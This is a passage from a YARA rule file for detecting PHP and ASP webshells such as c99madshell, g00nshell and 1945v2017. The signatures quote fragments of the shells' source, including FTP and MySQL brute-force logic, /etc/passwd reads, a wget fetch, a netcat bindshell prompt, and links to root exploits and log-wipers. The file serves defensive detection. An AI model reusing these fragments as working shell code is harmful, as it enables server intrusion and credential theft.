      $s8 = "echo \"MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sql_server)." ascii
      $s9 = "\"<tr><td>Target Directory:</td><td><input name=\\\"uploadpath\\\" size=\\\"70\\\" value=\\\"\".$dispd.\"\\\"></td></tr>\"." fullword ascii
      $s10 = "$fqb_log = \"FTP Quick Brute (\".$sh_name.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s11 = "else {echo \"<b>PHP-code Execution (Use without PHP Braces!)</b>\"; if (empty($eval_txt)) {$eval_txt = TRUE;}}" fullword ascii
      $s12 = "<input type=\"hidden\" name=\"sql_server\" value=\"<?php echo htmlspecialchars($sql_server); ?>\"><input type=\"hidden\" name=\"" ascii
      $s13 = "if (!headers_sent() and $gzipencode and !in_array($ft,array(\"img\",\"download\",\"notepad\"))) {" fullword ascii
      $s14 = "<input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\">" fullword ascii
      $s15 = "\"<tr><td>Target File Name:</td><td><input name=uploadfilename size=25></td></tr>\"." fullword ascii
      $s16 = ".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password - \\\"\".htm" ascii
      $s17 = "p_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; ?>\"><input type=\"submit\" name=\\\"submit\\\"" ascii
      $s18 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highl" fullword ascii
      $s19 = "array(\"User Without Password\",\"cut -d: -f1,2,3 /etc/passwd | grep ::\")," fullword ascii
      $s20 = "\" while (id <= num) { document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++; }\"." fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _21ed27ccd0fa985f29d353216238f2a928191fae_322a0646befd0343c7752913562bdfdee0a6c25a_88d0d4696c9cb2d37d16e330e236cb37cfaec4cd_32
{
   meta:
      description = "php17 - from files 21ed27ccd0fa985f29d353216238f2a928191fae.php, 322a0646befd0343c7752913562bdfdee0a6c25a.php, 88d0d4696c9cb2d37d16e330e236cb37cfaec4cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12038c703b71b2513d8ee0a78d9c51dc4ece725f3a4fd2ebe3fe6708dfd6ca9f"
      hash2 = "b8068c2aa02c4c3361a0caadbb86df262c1fe876a9543cfdf339f1a8dbb2ce8f"
      hash3 = "e85843849ddea1f90f1c0b3a54aa91d69a740bb5d06b7036315bc6529e96c43b"
   strings:
      $s1 = "'not_executed' => \"\\\"[%1]\\\" could not be executed successfully:\\n{%2}\"," fullword ascii
      $s2 = "'executed' => \"\\\"[%1]\\\" has been executed successfully:\\n{%2}\"," fullword ascii
      $s3 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s4 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s5 = "$src = ereg_replace('<font color=\"([^\"]*)\">', '<span style=\"color: \\1\">', ob_get_contents());" fullword ascii
      $s6 = "if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;" fullword ascii
      $s7 = "listing_page(error('not_executed', $file, implode(\"\\n\", $output)));" fullword ascii
      $s8 = "echo \"\\n\" . $_POST['user'] . ':' . crypt($_POST['password']);" fullword ascii
      $s9 = "if ($file['is_link']) $file['target'] = @readlink($path);" fullword ascii
      $s10 = "if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;" fullword ascii
      $s11 = "if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;" fullword ascii
      $s12 = "if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;" fullword ascii
      $s13 = "$regex = $e . '((\\.[^\\.' . $e . '][^' . $e . ']*)|(\\.\\.[^' . $e . ']+)|([^\\.][^' . $e . ']*))' . $e . '\\.\\.' . $e;" fullword ascii
      $s14 = "if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {" fullword ascii
      $s15 = "header('Content-Disposition: attachment; filename=' . basename($file) . ';');" fullword ascii
      $s16 = "$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);" fullword ascii
      $s17 = "if (array_key_exists('content', $_POST)) {" fullword ascii
      $s18 = "if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';" fullword ascii
      $s19 = "if (array_key_exists(\"checked$i\", $_POST) && $_POST[\"checked$i\"] == 'true') {" fullword ascii
      $s20 = "if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _aspydrv_ASPYDrvsInfo_33
{
   meta:
      description = "php17 - from files aspydrv.php, ASPYDrvsInfo.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "58940c0ea029b6b277fd16820be53a78c971c5d30fbe8bec2147399c6d89adb7"
      hash2 = "351dcaadf1055fdba56cf64490c988a359cc6df3362c08e07f10fa153d162c36"
   strings:
      $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
      $s2 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
      $s3 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
      $s4 = "<!-- Copyright Vela iNC. Apr2003 [alturks.com] Edited By KingDefacer-->" fullword ascii
      $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
      $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
      $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
      $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
      $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
      $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
      $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
      $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
      $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
      $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
      $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
      $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
      $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
      $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
      $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
      $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _150_817302ad2600b261f1f45b2c67a86138_aa65f58060d58b55e3bd202af53487a35913f539_34
{
   meta:
      description = "php17 - from files 150.php, 817302ad2600b261f1f45b2c67a86138.php, aa65f58060d58b55e3bd202af53487a35913f539.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a6249fbbbe830740c71c0f34f8bcada9bfbaa9bf07bf54b6bfb6b52178d9985f"
      hash2 = "5ccd08cbede6084e038334211ad9a744efca4bab0464685cb0538516202f9182"
      hash3 = "6701b3e0ec4aec6d6a7cfcb4e93c8be3e7de45dc868c65a230fdf9dd1ccbf636"
   strings:
      $s1 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s2 = "+g20O23YvrnxiRCMRh7LNGpypSixPEQpH/7xDkwsrxKRQpLf90rdINR42ud2lW/v4vjpNvLGHRh0GGqi/G72e9h46n3aJnoFZKQda/wgxGBj2dSjvxMa3+Hg5SrN9Thy" ascii
      $s3 = "EGPmwbdBrtwROjp3ArrAnT049lOuCf+en2ymN/RUQ6t349eaH6wCzKz0qGU7sYOjinYaNz3KzYWWNIKn2f7B0vKRQMLPO4SqrBs47X4AQyGELUD8DYEt9GPWxFtPPSUZ" ascii
      $s4 = "RSIoP5HG/PJ0pB6GsCfXlWoa96bjQh3dNUpHfMa+UUoOpZJ1u95ZApicDOWK7RK3Oc/nGetEfDk1vHnuWJJs3PdM4NA0YxAX1d3Gyw2fVcZtcuk4YSVDRr9th8504fWE" ascii
      $s5 = "jTAncF0sFFJ4GulNQybqL/h7d4oE3CsD5tEoyNqrqO/07MtXZA5U/j4a8/umYlPeLO11drBspYC/Wth8J9LYp81DMGHc1FsrwyGMP0d8CzQ4C6E1fplDEolfYCetfxGg" ascii
      $s6 = "JMOPuVZ/R8t3nsEpDpjIHDYwf66n5IfFGmKvlOGSeUCGZxzyuqV16Z/y+Tg914YNG57k5OM4ZglKeU/s32UJgghBanZEhNGt1fukmmL1+3emuFk+Pfh1mf1Z6VbxrUtk" ascii
      $s7 = "olRG4pRiEUCEvhvv6VzHApvbMTAM/tE4rg7U42XbmhjfRXmxsUggccjn8Jy/IR74SBdMDM525oh3iRvwVZQ+cobcUAJgHl8As9wQTgmYDlLh4fMzrq3qgkA6cTjqSsdp" ascii
      $s8 = "qCCbUFJkPOYdivro3xs0LKcN+picczDeL7S3SAZW3bLCcyezUmFYIjD53HJohCLOg6DyNgkDm8IOwaXxSW/V7OH+RywuOcLfIk+aOTtxrO9E1BAO+5iSS5qE41cLhpch" ascii
      $s9 = "GfwAvhyY+Epk4GyBNFvF5DLLlg2QVxiLSEoe/bZZZZvvBEqg+9IzhpDx32TE85Tc6VcY7jacf6Dk1e2vxwo3/jzzVwy/9vAVPxNneaojfvQfoV1YvOSl8AtTrXY+eXe7" ascii
      $s10 = "8qlADy6Wm+jbE8dLLqgdwOKYcIsj/DC/D6rIohpEBNRh5Tidrw4eIIWBwjsPcYDeTRrPXV/bBWzhGzhEs+9qmBv2JvLYlvQ/G6lnOhbnLjsBsEFxiyq+DpaDky6V29wE" ascii
      $s11 = "A5WNQvT44POAvKGeTIZSxulf0fmkGyw1AnR8LXwBD7I0BeEAO0Q42aIvrfq5JhYS1MiHOOHV5cdSZAWGHnDrojNwQtji4OTrnwglFh6+BPjHQxWmoE3y+rTeFnN7V+Sb" ascii
      $s12 = "k8oEH+fbitOX48mXsZESBEm0AsHneUAQWEAQtP5+KpBh/v3v//7nn3/+9V//+d//+c//AQ=='))); ?>" fullword ascii
      $s13 = "v4BntA+GknI88Cx1oCMDXgIzv/3Om9uBysqCSdrwB0z4AWpuNtZzUFlugbVdRL/buKaBXLxLruxvw//OGpDyRKy7dyWVKraJHRjDXsaSPbBbJ36qpZoTXx7G57Q9BCUe" ascii
      $s14 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s15 = "p/896pM/UvlxnRVVUbBINz9mfuTX9pdCq+Nrsy4Wrxl+XGoaYcdrslH3svGhrFz3cZ7PE2VzJumm9AgvSgT7IpfNz6QQ45dO8emZ0dbbIzHdVQCD+oU8G2GCpOCHCkeg" ascii
      $s16 = "UmFqzP5BAIh+3YFpcMZCCUll4hgTt82tfZKK+kwTrgIkBab0GidR80sgfWnklFxVJ3TV4M9H3NsUmv3JK2RTTei+O4Nf+MQtqyEsoqk+zQaTAdr4/a7Bh0Xrunn/X/w0" ascii
      $s17 = "kiJ3I7ZAExmpEWeQVvfPjlBgvIFXQNS9n1pmR808xFIE6p7zcih8Njx2VJQbinVQBcQyXyy0pn/9NV2g0mwNlWFDrhcfpy8HGY8f6f5Qd5zFHTuqRy3P82XHbwkRSJD5" ascii
      $s18 = "tCL7ZcQ9l5hBFtZI0hXTHqaX+kIycyPa5nGM5r6yxeZH/NK+sPABINJgmbPLV2L64a7BYe/V6iTctIqTFPyohGCc0MZ+20orzVA5/aFex6of63XGd8WxELwfPyrnvCNJ" ascii
      $s19 = "QKOa0sGSUZxEtTfybInSou0KLDD957zCIKct417R4867/ApG6J0DWASE3qUDYqKTvM4jBHKEUKCFUVJQPA80uz59mWhRBYb1j/9gO/DgYgP0J0K42TP65PhUWCh3W/Ge" ascii
      $s20 = "VZu7Ieyw4z8sauhj7Gt204ud6FXhgBZCkbiNA55yANXCqQ9uLL8VK9NEigyaLdrV7mhONhzmD/lFBLQebglZkFHc7VtqjZvyzUhEQzneNma4Atbxsr10mVh8NTpQ2Ly9" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _34127df2be5061288e2863da49b977a4a025273f_35aa7dca621fb62d8241030b4e03d301ae55fb61_5425e9f71fca02fd3ac7a3ffa8dbd254afec8213__35
{
   meta:
      description = "php17 - from files 34127df2be5061288e2863da49b977a4a025273f.php, 35aa7dca621fb62d8241030b4e03d301ae55fb61.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash2 = "05a9f8fa49f3244384e5647f76665e77dee63f9a81bf071f9ee2139278c18390"
      hash3 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash4 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
   strings:
      $s1 = "6261636b7368656c6c5f6465696e6974" ascii
      $s2 = "50726f63657373566965775f696e6974" ascii
      $s3 = "4b696c6c50726f636573735f696e6974" ascii
      $s4 = "50726f63657373566965775f6465696e6974" ascii
      $s5 = "4b696c6c50726f636573735f6465696e6974" ascii
      $s6 = "646f776e6c6f616465725f6465696e6974" ascii
      $s7 = "4c6f61644c69627261727941" ascii
      $s8 = "61626f75745f6465696e6974" ascii
      $s9 = "636d647368656c6c5f696e6974" ascii
      $s10 = "726567726561645f6465696e6974" ascii
      $s11 = "6261636b7368656c6c5f696e6974" ascii
      $s12 = "6f70656e333338395f6465696e6974" ascii
      $s13 = "72656777726974655f6465696e6974" ascii
      $s14 = "6f70656e333338395f696e6974" ascii
      $s15 = "646f776e6c6f616465725f696e6974" ascii
      $s16 = "47657450726f6341646472657373" ascii
      $s17 = "4d5a4b45524e454c33322e444c4c" ascii
      $s18 = "72656777726974655f696e6974" ascii
      $s19 = "726567726561645f696e6974" ascii
      $s20 = "636d647368656c6c5f6465696e6974" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86_1dc03138e5406f8e1f850181e92084ed0f4b5302__36
{
   meta:
      description = "php17 - from files 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 91241fc05105627c2f58942867db10b2b691574e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash2 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash3 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash5 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x2 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x3 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x4 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x5 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x6 = "ox','dif id=dif',0,'1').in('text','dif_name',17,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $x7 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));" fullword ascii
      $x8 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail_bomber\" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size']))" fullword ascii
      $x9 = "'eng_text123'=>'Test bypass open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)'," fullword ascii
      $s10 = "echo sr(10,\"\",$fs.in('hidden','cmd',0,'dos8').in('submit','submit',0,'Apache process killer').$fe);" fullword ascii
      $s11 = "if($sql->connect()) { echo \"[+] $user:\".strrev($user).\" - success\\r\\n\"; $suc++; }" fullword ascii
      $s12 = "if($sql->connect()) { echo \"[+] \".$_POST['mysql_l'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s13 = "@move_uploaded_file($HTTP_POST_FILES['userfile'.$upl]['tmp_name'],$_POST['dir'].\"/\".$nfn)" fullword ascii
      $s14 = "'eng_text130'=>'Test bypass open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)'," fullword ascii
      $s15 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',10,'irc.dalnet.ru'));" fullword ascii
      $s16 = "}else if(($_POST['brute_method']=='dic') && isset($_POST['ftp_login'])){" fullword ascii
      $s17 = "if(($safe_mode || $open_basedir) && @function_exists('error_log') && @version_compare(@phpversion(),\"5.2.2\")<=0)" fullword ascii
      $s18 = "echo \" Server IP: [<font color=blue>\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\"</font>]\";" fullword ascii
      $s19 = "'eng_text126'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)'," fullword ascii
      $s20 = "{$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/syslog.conf';}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _15e786a334203308d12856d155bbdb8088ed8afc_4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3_37
{
   meta:
      description = "php17 - from files 15e786a334203308d12856d155bbdb8088ed8afc.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash2 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
   strings:
      $x1 = "rityprobe.net\\\">c99madshell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "document.todo.grep.value='\".basename($binpath).\"';document.todo.submit();\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
      $x3 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x4 = "($d).\"';document.todo.processes_sort.value='\".$i.$parsesort[1].\"';document.todo.submit();\\\"><b>\".$head[$i].\"</b></a>\";}" fullword ascii
      $x5 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"#\\\" onclick=\\\"document.todo.act.v" ascii
      $s6 = "echo \"<form method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s7 = "$out = \"# Dumped by C99madShell.SQL v. \".$shver.\"" fullword ascii
      $s8 = "echo \"<a href=\\\"#\\\" onclick=\\\"document.sql.act.value='sql';document.sql.sql_login.value='\".htmlspecialchars($sql_login)." ascii
      $s9 = "if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];" fullword ascii
      $s10 = "if (isset($_POST['sql_login']))  {$sql_login=htmlspecialchars($_POST['sql_login']);}" fullword ascii
      $s11 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s12 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s13 = "sswd.value='1';document.todo.submit();\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s14 = "if ((!$submit) or ($sql_act)) {echo \"<table border=\\\"0\\\" width=\\\"100%\\\" height=\\\"1\\\"><tr><td><form method=\\\"POST" ascii
      $s15 = "if (isset($_POST['fullhexdump'])) $fullhexdump  = $_POST['fullhexdump'];" fullword ascii
      $s16 = "echo \"<br><form method=\\\"POST\\\"><input name='act' type='hidden' value='sql'><input name='sql_login' type='hidden' value='\"" ascii
      $s17 = "odo.submit();\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s18 = "echo \"<form method=\\\"POST\\\"><input type=hidden name='sql_tbl_act' value='insert'><input type=hidden name='sql_tbl_insert_q'" ascii
      $s19 = "elseif (!$data = c99getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s20 = "odo.processes_sort.value='\".$k.\"d\\\"';document.todo.submit();\\\">!</a>\";}" fullword ascii
   condition:
      ( ( uint16(0) == 0x2a2f or uint16(0) == 0x6544 ) and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0b0e93a29be990d421ee6b23671f7fbc104cb650_1bc95c69745b50619a937e830bc085b2c6c90094_70fe072e120249c9e2f0a8e9019f984aea84a504__38
{
   meta:
      description = "php17 - from files 0b0e93a29be990d421ee6b23671f7fbc104cb650.php, 1bc95c69745b50619a937e830bc085b2c6c90094.php, 70fe072e120249c9e2f0a8e9019f984aea84a504.php, 79b4102985370f66600af24d529ceac278106845.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c4b014b68d484905681e4055a154490ad2d48b732022b35eff98ee94c4d8232"
      hash2 = "565d9583cf9b7117ba1c7af86a0f8e520fad9b02397f34b6ac784094d9b4eba4"
      hash3 = "49839366d5f1b15ed9c222aa11bfe0d8aa96250944a8db6d8a0024509b780376"
      hash4 = "8433dcfcf3d911ea2f947298754d58102b60ad9b47caa60c88f96441fbdcba86"
   strings:
      $x1 = "$act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii
      $x2 = "if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii
      $x3 = "req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii
      $s4 = "\"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii
      $s5 = "'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii
      $s6 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s7 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii
      $s8 = "\"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii
      $s9 = "function cmd(){ // Command execution function" fullword ascii
      $s10 = "\"Basic Perl bindshell\"=>\"http://packetstormsecurity.org/groups/synnergy/bindshell-unix\"," fullword ascii
      $s11 = "<title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii
      $s12 = "\"h00lyshit - Linux 2.6 ALL\"=>\"http://someshit.net/files/xpl/h00lyshit\"," fullword ascii
      $s13 = "$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an'," fullword ascii
      $s14 = "\"k-rad3 - Linux <= 2.6.11\"=>\"http://someshit.net/files/xpl/krad3\"," fullword ascii
      $s15 = "$cmd = exec(\"python lookup.py \" . $servinf[0], $ret);" fullword ascii
      $s16 = "\"Vanish2.tgz\"=>\"http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz\"," fullword ascii
      $s17 = "\"THC rwwwshell-1.6.perl\"=>\"http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl\"," fullword ascii
      $s18 = "\"gh0st.sh\"=>\"http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh\"," fullword ascii
      $s19 = "echo(htmlentities($_POST['phpexec']) . \"</textarea>\\n<br>\\n\");" fullword ascii
      $s20 = "\"Cloak.c\"=>\"http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c\"," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1945_v2017_1945v2017_mei_1945v2017_meiFinal_39
{
   meta:
      description = "php17 - from files 1945-v2017.php, 1945v2017-mei.php, 1945v2017-meiFinal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8180ca0fef742928d9f69887f9307d7a5764a64c716d3c96fd0b9aeee753affe"
      hash2 = "62aa491f7087fac964232067a1d28cc8c56b644984c33b7b0f64ff869bb67a04"
      hash3 = "395bbabca853354b917d993a513bf0da82d3e7fbd3b75eb85f8e8e93205ae372"
   strings:
      $x1 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $x2 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x3 = "}else{ $username=$_COOKIE['username'];$password=$_COOKIE['password'];$database=$_COOKIE['database'];$hostname=$_COOKIE['hostname" ascii
      $x4 = "{$html->show(\"<center>\");$html->show($html->h1(\"Admin Finder\"));if(empty($_POST['scan'])){$input = $html->input(\"text\",\"u" ascii
      $x5 = "{$html->show(\"<center>\");$html->show($html->h1(\"About 1945v2017\"));$html->show(\"<b>MerdekaAtoeMati</b><br>\");$html->show(" ascii
      $x6 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x7 = "5 shell by : \".$html->a(\"https://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\").\"</i>\");$html->show(base6" ascii
      $x8 = "ldlist</b><br>\";$val = $act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt\");" ascii
      $x9 = "class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect')) ? \"<font color=lime>ON</font>\" : \"<font c" ascii
      $x10 = "te\",\"value=\\\"Execute query\\\"\").\"<br>\"; $cn = mysql_connect($hostname,$username,$password) or die(mysqli_error()); $cn.=" ascii
      $s11 = "br>\".$html->submit(\"execute\",\"value=\\\"Execute query\\\"\").\"<br>\";$cn = mysqli_connect($hostname,$username,$password,$da" ascii
      $s12 = "ipe\",$_POST['connect_mode'],$exp);$html->show(\"<meta http-equiv='refresh' content='0;url='>\");} " fullword ascii
